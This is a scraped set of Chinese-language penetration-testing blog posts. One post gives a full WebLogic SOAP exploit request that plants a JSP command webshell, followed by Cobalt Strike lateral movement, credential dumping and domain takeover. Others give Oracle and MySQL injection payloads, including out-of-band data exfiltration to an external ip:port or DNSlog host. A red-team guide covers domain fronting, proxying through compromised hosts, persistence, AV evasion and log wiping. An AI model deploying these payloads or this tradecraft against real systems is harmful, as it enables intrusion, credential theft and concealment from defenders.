先通过CVE-2020-2725,上传一个CMD马,获得WebShell,Payload如下: POST /_async/AsyncResponseService HTTP/1.1 Host: 192.168.111.80:7001 Content-Length: 1101 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;&lt;soapenv:Header&gt;&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.xmlDecoder&quot;&gt;&lt;object class=&quot;java.io.PrintWriter&quot;&gt;&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/shell.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;&lt;string&gt;&lt;![CDATA[ &lt;% if(&quot;loecho&quot;.equals(request.getParameter(&quot;pwd&quot;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[1024]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(&quot;&lt;/pre&gt;&quot;); } %&gt;]]&gt; &lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;&lt;/object&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt; 0x02 CobaltStrike,进内网: 查看进程,先维持权限,信息收集,摸清楚网络结构 存在360主动防御 查看网络环境,存在域环境,de1ay.com,Ping一下获得域控IP,网络环境大致为:10.10.10/24段为内网IP 对服务器进行详细的信息收集,尝试抓取各类密码: - 通过&lt;a&gt;seatbelt&lt;/a&gt;进行详细的信息收集: **seatbelt.exe -group=all -full** Ladon对内网10.10.10.0/24网段,以及192.168.111.0/24进行存活探测,发现主机 尝试提权,提取SYSTEM权限,通过MS14058,提权成功!,继续进行信息收集,域渗透 0x03 横向渗透 收集域信息,得到结果: 域控我们判断正确,实际情况下DNS服务所在的服务器通常为域控: 进行信息收集,包括域管理员hash 密码 当前服务器密码,通过工具:lazagne 和 Mimikatz 收集 接下来我们查看域内机器,域管理员,域组账户,等等 通过筛选PID,我们找到域管理员的PID进程,进行伪造Token,因为已经抓取到明文密码了,也可以生成Token，直接上线,方式很多,我使用假设没有抓到密码的情况 得到Token后,看一下是否能共享文件: 可以伪造成功,可以共享文件: 上线域控,我们通过Web服务器进行中转流量,以后的机器流量都通过Web服务进行跳板: 同样方式,通过域管理员的账号密码,上线 mssql 0x04 总结与想法 域内机器已经全部上线,是信息收集和权限维持非常重要 在真实环境中,环境相比来说会很大很复杂,可能会需要多层跳板机来进入到关键部分,测试时通过ping curl nc neskloop等,来判断具体出网情况,来打隧道,建立跳板 同时我们要维持好自己手中的机器,上一台维持一台收集一台 完全收集完后,在进行下一步,每部权限都要维持好,以免大批量横向时 HW中,当我们在有了大批量机器时,一定要收集好信息,翻找文件,为下一步深入做铺垫,直到拿下核心资产 在真实环境中,我们在拿到一部分机器时,我通常会先信息收集,在小范围探测,拿下小范围机器后,在进行大范围横向, 对各类工具,要进行免杀处理,修改下源码或者重新编译一下 0x05 提升与进步: 在面对更复杂环境时,摸清网络结构,大致构造拓扑,结合信息收集完善拓扑 横向和纵向时间,逐渐能够实现全自动的内网渗透,短时间完成攻击任务 完善工具,了解市面常见AV 防病毒 HIDS特性,为绕过安全设备做准备 ","link":"https://1oecho.github.io/ATK&CK-02/"},{"title":"红队开发: CobaltStrike-反编译自定义功能学习","content":"CobaltStrike-反编译自定义功能学习 (一) 最近看了RedCore红队学院的CSTips的直播课程,学习到了大佬,在渗透测试中的一些关于CS自定义功能的一些方法和步骤,于是按照大佬的方法自己尝试搞一下,本身自己Java代码能力很弱,慢慢学习,以此为记录 0x02 基本过程 ​ (1). 反编译Jar包 平时自己在反编译时,只会通过jd-jui或者用其他一些反编译工具,这些工具反编译的结果和效果也不是很好 ,看了课程学会了新知识! 步骤如下 1. 通过IntelliJ IDEA自带的插件进行,反编译,插件路径为,IDE的跟目录下的plugins下的java-decompiler.jar: 2. 因为这个只是一个插件,将jar文件拷贝出来,直接通过java -jar运行,会运行失败! 直接通过命令,运行jar里面的反编译主类: # 具体命令如下: java -cp java -cp ./java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true (1)需要反编译的jar文件路径 (2)反编译完的jar文件保存路径 # 反编译CS的Cobaltstrike.jar文件,命令为: java -cp ./java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true ./cs_bin/cobaltstrike.jar ./cs_src/ 3. 反编译完成后,解压反编译后的jar文件就会得到完整的源码,目录结构如下 (2) 配置IEDA的具体配置,处理相关依赖 1. 创建项目,导入反编译后解压的jar文件里面的具体代码,目录结构设置为一致: 设置相关配置,处理依赖,添加jar路径,应用设置: 3. 配置主类的名称: (3) 接下来就是,修改代码: 你修改那个文件,就把jar文件下的.java文件,复制到src目录,如果需要更改子目录下的名称同名的文件,目录结构也要保持一致 下面以 windows/Aggressor.java文件为例 ​ 1.将反编译源代码下的具体文件,复制文件到src目录: 2. 创建同名的目录aggressor,复制文件进去: 3. 修改文件,添加一个弹窗: 4.保存打包为jar包,运行看一下效果 5. 输出文件在out文件夹下,运行,添加运行jar的配置文件: 添加俩个vm选项,将auth文件放进目录: 7 . 可以直接运行,运行成功,弹出了我们设置的消息框,CS客户端也成功运行了: 0x03 To do 后续我们就可以通过这种方式来进行 自定义改造了,改造那个文件,就把源码复制进src,修改完后打包jar文件,就可以 添加自定义功能呢,实现一键信息收集到内网渗透 修改特征,自定以功能 等等… ","link":"https://1oecho.github.io/cobatstrike-01/"},{"title":"知识汇总: Oracle  注入 All in ONE","content":"Oracle 数据库常用于一些大型公司,平常都配合Java的后端来使用，在企业以及各类主流单位都作为主要数据库,平时在测试中也经常遇到注入漏洞,所以就总结一下,注入过程,从注入判断到数据的获取,全过程记录,包含一个典型实际案例 0x01 寻找并判断注入点 注意：避免使用 and 1=1这样的测试语句 数字型: 数字型的注入,和其他类型数据库时都一样,自己构造加减乘除的条件来判断注入 Payload: #通过 &lt;&gt; 来判断 ?id=1'+and+1&lt;&gt;2--+ #返回为真 页面正常 ?id=1'+and+1&lt;&gt;1--+ #返回为假 页面异常 #通过 加减法来判断 ?id=1 #返回id,为1的内容 ?id=2-1 #返回为1的内容 #通过数据库报错来判断 ?id=1 #返回为正常 ?id=1/0 #返回异常 # 通过注释符来判断(多行注释:/**/,单行注释:--) ?id=1 #返回为正常 ?id=1/*loecho*/ #也返回正常 ?id=1 #返回为正常 ?id=1--loecho #也返回正常 字符型 字符型注入相对数字型来说,会存在闭合一些数据引用符号的问题,例如语句通过'闭合语句后,后续就要通过单行注释符来注释剩下的单引号,其他情况也是如此 Payload: #通过&lt;&gt;来判断 ?name=loecho'+and+1&lt;&gt;6--+ #返回正常 ?name=loecho'+and+1&lt;&gt;1--+ #返回异常 #使用字符串拼接符’||’，通过判断拼接符是否执行，从而判断是否存在注入 ?name=lo'||'echo #返回正常 ?name=lo'||'haha #返回异常 0x02 利用并且查询数据 01. 联合查询 即利用union select将想要查询的数据显示在页面上，构造正常语句，成功执行SQL语句查询数据 具体步骤如下: # 01.先判断列数,同Mysql一样 ?id=1'+order+by+4--+ #返回正常 ?id=1'+order+by+5--+ #提示报错 得出结论数据为: 5 列 # 02.然后对每一列的数据类型进行判断（可以使用null代替某些无法快速猜测出数据类型的位置），先默认每一列均为null，然后从第一列开始依次将null改为字符串，如果报错则说明该列是数字型，否则则是字符型。,同Mysql一样 ?id=1'+union+select+user+null+null+null+from+dual--+ #查询当前用户名 以此类推 # 03. 利用select table_name from user_tables where rownum=1获取表名（列名table数据同理）： select column_name from user_tab_columns where table_name='TB_USER' and rownum=1（获取列名） select USER_ID from TB_USER where USER_ID=1 and rownum=1（获取数据） 03. 报错注入 构造报错语句，通过数据库报错来带出我们要查询的数据，常用的报错函数包括 XMLType() # 中间为查询语句 upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) dbms_xdb_version.checkin() # 中间为查询语句 upper(dbms_xdb_version.checkin((select user from dual))) ctxsys.drithsx.sn() # 中间为查询内容 upper(dbms_xdb_version.checkin((select user from dual))) ordsys.ord_dicom.getmappingxpath() # 中间为查询内容 ordsys.ord_dicom.getmappingxpath(user,user,user) dbms_utility.sqlid_to_sqlhash() # 中间为查询内容 dbms_utility.sqlid_to_sqlhash((select user from dual)) 02.OOB外带数据 通过HTTP请求,或者DNSlog,来构造语句,如果目标出网,并且对数据库函数没有进行限制,就会实现攻击 HTTP 请求外带数据 and utl_http.request('http://ip:port/'||(select banner from sys.v_$version where rownum=1))=1-- 查询指纹版 and utl_http.request('http://ip:port/'%7C%7C(select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual))=1 -- 查询环境 and%20 utl_http.request('http://ip:port/'%7c%7c (select user from dual))=1-- 查询当前用户 and%20%20utl_http.request(%27http://ip:port/%27%7c%7c(select%20instance_name%20from%20v$instance))=1--查询具体内容 and utl_http.request('http://ip:port/'||(select TABLE_NAME from all_tables where rownum=1))=1-- 查询所有数据表名 select name from v$database; select instance_name from v$instance; 1.查询所有数据库 由于Oralce没有库名,只有表空间,所以Oracle没有提供数据库名称查询支持，只提供了表空间名称查询。 select * from v$tablespace;--查询表空间(需要一定权限) 2.查询当前数据库中所有表名 select * from user_tables; 3.查询指定表中的所有字段名 select column_name from user_tab_columns where table_name = 'table_name'; 4.查询指定表中的所有字段名和字段类型 select column_name, data_type from user_tab_columns where table_name = 'table_name'; DSNlog请求外带数据 - UTL_HTTP.REQUEST select name from test_user where id =1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||'.dnslog') FROM sys.DUAL; - DBMS_LDAP.INIT select name from test_user where id =1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||'.dnslog',80) FROM sys.DUAL; - HTTPURITYPE select name from test_user where id =1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||'.dnslog').GETCLOB() FROM sys.DUAL; - UTL_INADDR.GET_HOST_ADDRESS select name from test_user where id =1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||'.dnslog') FROM sys.DUAL; 03. 基于布尔值的盲注 通过构造不同条件,返回返回页面的不同,就形成了Bool值的注入 通过 substr() decode() 函数的盲注(常用) # 按位截取数据,Bp俩个标记:第一个为截取位数,第二个为:所有字符: and+1=(select+decode(substr((select user from dual),§1§,1),'§S§',(1),0) from dual)--+ #查 user and+1=(select decode(substr((select banner from sys.v_$version wher rownum=1),1 ,1),'S',(1),0) from dual)--+ # 查version and+1=(select decode(substr((select table_name from user_tables where rownum=1),§1§,1),'§S§',(1),0) from dual)--+ # 查表名 通过 case、substr()、ascii() 函数的盲注 # 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126): 123=(case when ascii(substr(user,§0§,1))=§121§ then '123' else '456' end)--+ 通过 case、instr()、chr() 函数的盲注 # 按位截取数据,Bp俩个标记:第一个为:所有可见字符的ASCII码(32~126): 第二个,第三个为:值相同为截取位数 123=(case instr(user,chr(§*§),§*§,1) when §*§ then '123' else '456' end)--+ 还有其他方式来利用,配合函数,不同环境不同用法 03 .基于时间的盲注 时间盲注，基于服务器返回所用的时间，判断函数是否执行，从而判断是否存在注入 Decode()、DBMS_PIPE.receive_message()、chr()、substr()利用 # 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126): '||decode(substr(user,§*§,1),chr(§*§),DBMS_PIPE.receive_message('sen',1),2)||' #查user 0x03 实际案例分析 某次授权测试,某小程序后端在检查登录时,存在Oracle注入漏洞,注入类型为基于布尔类型的注入 过滤空格，Json包注入，抓包标记注入点 因为Sqlmap对于页面差异小布尔判断不准确，所以注入时加上以下任一参数，配合Tamper脚本即可注入成功： --string=STRING 查询时有效时在页面匹配字符串 --not-string=NOT.. 当查询求值为无效时匹配的字符串 或者通过国产的一个工具：超级SQL注入工具标记好数据包以及布尔变换和空格替换，都可以成功 手工判断 条件为真时: 条件为假时: 由此构造条件来查询数据,当前数据库版本,结果如下 Paylaod: {&quot;tel&quot;:&quot;18848888888/**/and/**/1=(select/**/decode(substr((select/**/banner/**/from/**/sys.v_$version/**/where/**/rownum=1),1 ,1),'S',(1),0)/**/from/**/dual)&quot;} 0x04 : 想法 实际测试中,网站直接交互存在注入的概率不是很大,着重测试一些微应用的后端交互，或者后端API 只要自己成功判断后端执行了我们拼接的SQL语句，就是存在问题，配合数据库特性1/0也是可以的 搜索处，表单的提交，各类刁钻的地方，只要猜测后端有交互的，都可以测试，会有惊喜！ ","link":"https://1oecho.github.io/oracle-sqli/"},{"title":"知识汇总: MySQL未知列名的注入Tips","content":"0x01 适用场景 未知列名的情况下,子查询注入(设置别名),实现联合查询注入 未知列名的情况下,子查询配合报错注入,实现布尔盲注和时间盲注 0x02 实际案例 ​ (1) 第一种情况: 限制条件: 过滤了OR关键字,information_schema表不能利用 正常情况下我们在联合查询注入时,通过判断列长度,以及显示位后,构造联合查询语句,查询MySQL的 information_schema 表来查询我们需要的数据,当以存在这种情况,可以通过: (1). 查询sys数据库进行数据查询，使用sys数据库需要满足: 1.数据库版本大于等于5.7 2.数据库用户为root@localohost用户 Payload: 查询所有的库： SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema; SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema; 查询指定库的表（若无则说明此表从未被访问）： SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='loecho' GROUP BY table_name; SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema='loecho' GROUP BY table_name; 统计所有访问过的表次数:库名,表名,访问次数 select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc; 查看所有正在连接的用户详细信息:连接的用户(连接的用户名,连接的ip),当前库,用户状态(Sleep就是空闲),现在在执行的sql语句,上一次执行的sql语句,已经建立连接的时间(秒) SELECT user,db,command,current_statement,last_statement,time FROM sys.session; 查看所有曾连接数据库的IP,总连接次数 SELECT host,total_connections FROM sys.host_summary; (2). 通过构造虚拟表的方式,来查询数据,也就是我们说的子查询注入,数据如下 具体步骤如下: 构造一个虚拟表 查询虚拟表的内容,就会查到我们需要的数据 可以发现我们构造的数据第一列为用户名,第二列为密码,我们构造查询得到所有密码 4 . 实现我们的查询效果,同理第一列为用户名,在实际测试中,列名我们需要通过自己构造条件来判断,如果列数过多则会报错 ​ (2) 第二种情况: 限制条件: 特殊盲注,构造语句后只会显示 Mysql Error和其他情况 特殊盲注,手工构造语句,发现回显不同来构造盲注 特殊盲注,mysql error的前提下延时与不延时 实际案例: 2019全国大学生安全竞赛 Web题目:全宇宙最简单的的SQL 本题突破点: username 存在注入点 过滤了 or || 当最终拼接语句无错误时,无论结果如何均为 登录失败 当最终语句有错时,返回为 数据库操作失败 所以我们构造Paylaod如下: 0.) SQL注入报错函数 报错注入只适用于没有自定义错误页面，或直接返回mysql报错信息的情况下，所需条件较为苛刻，但利用难度低。 以下都以获取user为例： 1.1.1. count()、rand()导致group by报错 测试方法 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) 1.1.2. updatexml报错 测试方法 and updatexml(1,concat(0x7e,user()),1) 注意事项 适用于MySQL 5.1.5及以后的版本 1.1.3. extractvalue报错 测试方法 and extractvalue(1,concat(0x7e,user())) 注意事项 适用于MySQL 5.1.5及以后的版本 1.1.4. 其他函数 测试方法 and geometrycollection((select * from(select * from(select user())a)b)) and multipoint((select * from(select * from(select user())a)b)) and polygon((select * from(select * from(select user())a)b)) and multipolygon((select * from(select * from(select user())a)b)) and linestring((select * from(select * from(select user())a)b)) and multilinestring((select * from(select * from(select user())a)b)) and exp(~(select * from(select user())a)) 1). 分析一下,通过异或来判断真假,因为过滤or关键字,不能查询information_schema表 '^(select exp(~( 查询语句 )*18446744073709551615)))#&amp;password=admin 2). 而且不知道列名,完成虚拟表构造,查询虚拟表c 的 b列就是,后面查询User表的密码 (select ( (( select c.b from (select 1 as a,2 as b,3 as d from user union select * from user)c where a='admin' )) ) '^(select exp(~((select ( (( select c.b from (select 1 as a,2 as b,3 as d from user union select * from user)c where a='admin' )) ))*18446744073709551615)))#&amp;password=admin 3). 最后注入得到密码,进行后续操作,得到Flag ","link":"https://1oecho.github.io/c-zJSfh0F/"},{"title":"小工具: CobaltStrike Becon上线 微信实时推送!","content":"0x01 起因: 因为最近在测试一些社工钓鱼方式的目标,每次等待Beacon回弹有点蛋疼! 就按照网上的一些方式,写了一个上线提醒的插件,通过微信Server酱提醒,效果测试后还可以! Github地址: https://github.com/a1ices/CobaltStrike_Script_Wechat_Push 0x02 测试配置 1. 远程上线一下: 2. Beacon 回弹,server酱提醒! 3.使用方法: 因为是通过客户端提醒的,我们可以通过CobaltStrike 自带的agscript来运行这个插件,在服务段后台运行: 一 .填入你的Server酱的Key,链接如下:: http://sc.ftqq.com/3.version (1) 打开链接,登入Github账号,微信绑定公众号,在微信推送选项里就有. (2) 打开cna文件,添加Key: (3) 后台运行cna插件: ./agscript [host] [port] [user] [pass] [host] 服务端IP [port] cs的端口号，默认50050 [user] 用户名 [pass] cs的密码 [path] cna插件的路径 (4) 配置成功后,你的Server酱会收到测试消息! (5) 有其他需要的可以改下脚本,原理很简单!(钉钉.企业微信) ","link":"https://1oecho.github.io/CX976pZ6d/"},{"title":"知识技巧: MySQL盲注技巧记录","content":"0x01 目的 总结一下,在CTF比赛中常用的SQL盲注技巧,一直更新,目的是为了锻炼自己在比赛中,快速编写过滤字符的SQL盲注脚本,实现各种骚技巧 0x02 分析 (一 )^ 异或的使用: mysql中实验结果: mysql&gt; select * from user where id = 1^0; ===&gt; 做异或运算 +----+--------+----------+ | id | name | password | +----+--------+----------+ | 1 | loecho | 123456 | +----+--------+----------+ 1 row in set (0.00 sec) mysql&gt; select * from user where id = 1^1; ====&gt; 做异或运算 Empty set (0.00 sec) 实际使用: 1.其他截取方式,按照过滤规则和Fuzz结果变换 2.条件判断通过^来判断 3.编写脚本 实验: 构造Paylod: 恒假条件 http://127.0.0.1:32769/Less-8/?id=1'^(length(database())&lt;0)^'--+ 恒真条件 http://127.0.0.1:32769/Less-8/?id=1'^(length(database())&gt;0)^'--+ 脚本编写: 1.条件判断为,不存在标志为真,反之为假 2.Payload构造 http://127.0.0.1:32769/Less-8/?id=1'^(ascii(substr(database(),1,1))='115')^'-- 脚本如下: 运行结果: (二) 正则Regexp函数: mysql 中的正则有三种常用的方式 like 、rlike 和 regexp ，其中 Like 是精确匹配，而 rlike 和 regexp 是模糊匹配(只要正则能满足匹配字符串的子字符串就成立为真!) 当然他们所使用的通配符略有差异： (1)like 常用通配符：% 、_ 、escape % : 匹配0个或任意多个字符 _ : 匹配任意一个字符 escape ： 转义字符，可匹配%和_。如SELECT * FROM table_name WHERE column_name LIKE '/%/_%_' ESCAPE'/' (2)rlike和regexp:常用通配符：. 、 、 [] 、 ^ 、 $ 、{n}* . : 匹配任意单个字符 * ： 匹配0个或多个前一个得到的字符 [] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。 ^ : 匹配开头，如^s匹配以s或者S开头的字符串。 $ : 匹配结尾，如s$匹配以s结尾的字符串。 {n} : 匹配前一个字符反复n次。 实验: 1.库名为: security 2.Mid,substr 都可以截取 为了显示清楚,就不那数据库演示了,使用SQL-lab的第二关,可以联合查询的关卡,演示 构造Payload如下,2,3为显示位数: http://192.168.0.108:88/Less-2/?id=-1 union select 1,2,3--+ 在显示为上操作,截取第一位字母,为s: http://192.168.0.108:88/Less-2/?id=-1 union select 1,mid(database(),1,1),3--+ 配合正则来判断,现在是有显示情况,但是没有显示时,我们在只能利用盲注是来判断真假, 在我们知道条件下,构造一个为真的条件,看返回(判断第一位是否为s),返回1说名为真!: http://192.168.0.108:88/Less-2/?id=-1 union select 1,mid(database(),1,1) regexp '^s',3--+ 构造个假的来看,返回为0: http://192.168.0.108:88/Less-2/?id=-1 union select 1,mid(database(),1,1) regexp '^a',3--+ 通过上面实验我们就可以,来构造我们的脚本啦 但是在我测试过程中,还发现一个点,正则判断是时大小写是不敏感的,什么意思那,就是现在已知我们的库名为security,第一位为小写s,正则设置为 ^'S' ,大写S,还是会返回真 想了个解决办法就是加Ascii函数,转为ascii码值在比较,因为ascii码对应字母大小写 我们为了提交注入效率,要利用到二分的想法. 1.把数据按位截取,确定范围,可以通过正则来大致判断(看是否为0-9,a-z) 2.确定了大范围后,就可以从小范围中,利用二分法来读取数据 3.实际情况,变换截取方式,总的方法还是不变 提取数据方式: and 1=(mid(database(),{},1) regexp '^{}')--+ 脚本实现: 考虑大小写问题,为了看效果,我们查看一下数据库路径(里面包含大小写特殊符号),最终Payload: and 1=(ascii((mid(@@datadir,{},1)) regexp '^{}')--+ (三) 利用移位符号 &gt;&gt; 效率相对于其他盲注来说,是最高的.基本原理,以为字母可以转换为八位的二进制说,在SQL注入中,我们诸位截取字符串,转为二进制数在进行诸位判断,每个字符串最多查询八次就会得到数据,分析如下: 比如查询一个 库名 : LoEcH0 的数据库名,普通盲注,我们获取到库名长度后,按照每位查询. 先贴上Ascii码表,可显字符(标记十进制:): L : ascii码值(十进制): 76 次数: 32~76 = 44 o : ascii码值(十进制): 111 次数: 32~111 = 79 E : ascii码值(十进制): 69 次数: 32~69 = 37 c : ascii码值(十进制): 99 次数: 32~99 = 67 H : ascii码值(十进制): 72 次数: 32~72 = 40 0 : ascii码值(十进制): 48 次数: 32~99 = 67 而对应通过二进制查询,每位最多查8次就找到字符,DB_Length x 8= 8*Length 次,这是最多查询次数,实际次数是要小于这个次数的. 通过这个想法来构造Payload 已知: user() = root@localhost 第一位 r 二进制: 01110010 ,Payload是截取第一位字母转为二进制右移 7位,后面 = 0 为真,结果如下: 为真条件:(1=1 为真 ) http://localhost:88/Less-2/?id=-1 union select 1,(ascii(mid(user(),1,1)) &gt;&gt; 7 )=0,user()--+ 为假条件(1 = 0 为假) http://localhost:88/Less-2/?id=-1 union select 1,(ascii(mid(user(),1,1)) &gt;&gt; 7 )=0,user()--+ 盲注标记测试: 条件为真,返回标记(You are in.......): http://localhost:88/Less-8/?id=1' and (ascii(mid(user(),1,1)) &gt;&gt; 7 )=0--+ 条件为假,不返回标记: http://localhost:88/Less-8/?id=1' and (ascii(mid(user(),1,1)) &gt;&gt; 7 )=1--+ 通过得到结果,构造Payload,写脚本,直接看大佬博客吧,有现成的!: 链接在这: https://phpinfo.me/2015/08/30/1026.html 继续更新.... ","link":"https://1oecho.github.io/-mzuWFTQb/"},{"title":"内网渗透流程化学习记录","content":"0x01 前期准备: 系统学习一下,内网渗透.以此为记录,记录各种学习中的坑,和解决问题的过程 GIthub 内网渗透教程: https://github.com/l3m0n/pentest_study 内网渗透Tips: https://github.com/Ridter/Intranet_Penetration_Tips 说到内网渗透,Coballt Strike 那就是不得不提的工具,作为内网神器,我们提前部署到VPS 1.Domain Fronting技术,隐藏服务端,具体实现方法为: 隐匿的攻击之-Domain Fronting: https://evi1cg.me/archives/Domain_Fronting.html 2.客户端添加插件,推荐插件: CobaltStrike后渗透测试插件: https://github.com/DeEpinGh0st/Erebus K8gege的LadonCS插件]: http://k8gege.org/p/648af4b3.html 3.文件操作类方法,通过临时邮箱+Github来实现文件传递匿名化 4.服务端交互流量隐藏,具体Google实现方法很多. 5.免杀方法以及具体利用环境,可以学习红日安全团队的免杀列文章.学习土司论坛内大佬的各类姿势 6.流量代理Vray和Tor加肉鸡跳板机多层代理.(所有HTTP流量经过BurpSuit,控制BurpSuit上层流量的出口.其他TCP流量通过SSTap全局代理来实现) 7.在测试中,对于已授权的系统测试,或者SRC挖掘,尽量避免对业务系统正常运行,一些敏感非必要操作杜绝 8.一切涉及敏感操作行为的动作,在虚拟机或者洋机中进行 0x02 实现步骤(转载): Author: Evi1cg Blog: https://evi1cg.github.io Table of Contents 信息搜集 开源情报信息收集（OSINT） github whois查询/注册人反查/邮箱反查/相关资产 google hacking 创建企业密码字典 字典列表 邮箱列表获取 泄露密码查询 对企业外部相关信息进行搜集 子域名获取 进入内网 基于企业弱账号漏洞 基于系统漏洞进入 网站应用程序渗透 无线Wi-Fi接入 隐匿攻击 Command and Control Fronting 代理 内网跨边界应用 内网跨边界转发 内网跨边界代理穿透 EW Termite 代理脚本 shell反弹 内网文件的传输和下载 搭建 HTTP server 内网信息搜集 本机信息搜集 1、用户列表 2、进程列表 3、服务列表 4、端口列表 5、补丁列表 6、本机共享 7、本用户习惯分析 8、获取当前用户密码工具 Windows Linux 扩散信息收集 端口扫描 常用端口扫描工具 内网拓扑架构分析 常见信息收集命令 第三方信息收集 权限提升 Windows BypassUAC 常用方法 常用工具 提权 Linux 内核溢出提权 计划任务 SUID 系统服务的错误权限配置漏洞 不安全的文件/文件夹权限配置 找存储的明文用户名，密码 权限维持 系统后门 Windows 1、密码记录工具 2、常用的存储Payload位置 3、Run/RunOnce Keys 4、BootExecute Key 5、Userinit Key 6、Startup Keys 7、Services 8、Browser Helper Objects 9、AppInit_DLLs 10、文件关联 11、bitsadmin 12、mof 13、wmi 14、Userland Persistence With Scheduled Tasks 15、Netsh 16、Shim 17、DLL劫持 18、DoubleAgent 19、waitfor.exe 20、AppDomainManager 21、Office 22、CLR 23、msdtc 24、Hijack CAccPropServicesClass and MMDeviceEnumerato 25、Hijack explorer.exe 26、Windows FAX DLL Injection 27、特殊注册表键值 28、快捷方式后门 29、Logon Scripts 30、Password Filter DLL 31、利用BHO实现IE浏览器劫持 Linux crontab 硬链接sshd SSH Server wrapper SSH keylogger Cymothoa_进程注入backdoor rootkit Tools WEB后门 横向渗透 端口渗透 端口扫描 端口爆破 端口弱口令 端口溢出 常见的默认端口 1、web类(web漏洞/敏感目录) 2、数据库类(扫描弱口令) 3、特殊服务类(未授权/命令执行类/漏洞) 4、常用端口类(扫描弱口令/端口爆破) 5、端口合计所对应的服务 信息搜集 powerview.ps1 BloodHound 获取域内DNS信息 获取域控的方法 SYSVOL MS14-068 Kerberos SPN扫描 Kerberos的黄金门票 Kerberos的银票务 域服务账号破解 凭证盗窃 NTLM relay Kerberos委派 地址解析协议 获取AD哈希 AD持久化 活动目录持久性技巧 Security Support Provider SID History AdminSDHolder＆SDProp 组策略 Hook PasswordChangeNotify Kerberoasting后门 AdminSDHolder Delegation TIPS 相关工具 在远程系统上执行程序 IOT相关 中间人 规避杀软及检测 Bypass Applocker bypassAV 痕迹清理 Windows日志清除 破坏Windows日志记录功能 msf 3389登陆记录清除 信息搜集 开源情报信息收集（OSINT） github Github_Nuggests（自动爬取Github上文件敏感信息泄露） :https://github.com/az0ne/Github_Nuggests GSIL（能够实现近实时（15分钟内）的发现Github上泄露的信息） :https://github.com/FeeiCN/GSIL x-patrol(小米团队的):https://github.com/MiSecurity/x-patrol whois查询/注册人反查/邮箱反查/相关资产 站长之家:http://whois.chinaz.com/?DomainName=target.com&amp;ws= 爱站:https://whois.aizhan.com/target.com/ 微步在线:https://x.threatbook.cn/ IP反查:https://dns.aizhan.com/ 天眼查:https://www.tianyancha.com/ 虎妈查:http://www.whomx.com/ 历史漏洞查询 : 在线查询:http://wy.zone.ci/ 自搭建:https://github.com/hanc00l/wooyun_publi/ google hacking 创建企业密码字典 字典列表 passwordlist:https://github.com/lavalamp-/password-lists 猪猪侠字典:https://pan.baidu.com/s/1dFJyedz Blasting_dictionary（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等） 针对特定的厂商，重点构造厂商相关域名的字典 ['%pwd%123','%user%123','%user%521','%user%2017','%pwd%321','%pwd%521','%user%321','%pwd%123!','%pwd%123!@#','%pwd%1234','%user%2016','%user%123$%^','%user%123!@#','%pwd%2016','%pwd%2017','%pwd%1!','%pwd%2@','%pwd%3#','%pwd%123#@!','%pwd%12345','%pwd%123$%^','%pwd%!@#456','%pwd%123qwe','%pwd%qwe123','%pwd%qwe','%pwd%123456','%user%123#@!','%user%!@#456','%user%1234','%user%12345','%user%123456','%user%123!'] 密码生成 GenpAss（中国特色的弱口令生成器: https://github.com/RicterZ/genpAss/ passmaker（可以自定义规则的密码字典生成器） ：https://github.com/bit4woo/passmaker pydictor（强大的密码生成器） ：https://github.com/LandGrey/pydictor 邮箱列表获取 theHarvester ：https://github.com/laramies/theHarvester 获取一个邮箱以后导出通讯录 LinkedInt :https://github.com/mdsecactivebreach/LinkedInt Mailget：https://github.com/Ridter/Mailget 泄露密码查询 ghostproject: https://ghostproject.fr/ pwndb: https://pwndb2am4tzkvold.onion.to/ 对企业外部相关信息进行搜集 子域名获取 Layer子域名挖掘机4.2纪念版 subDomainsBrute ：https://github.com/lijiejie/subDomainsBrute wydomain ：https://github.com/ring04h/wydomain Sublist3r ：https://github.com/aboul3la/Sublist3r site:target.com:https://www.google.com Github代码仓库 抓包分析请求返回值(跳转/文件上传/app/api接口等) 站长帮手links等在线查询网站 域传送漏洞 Linux dig @ns.example.com example=.com AXFR Windows nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器 nslookup #进入nslookup交互模式 server 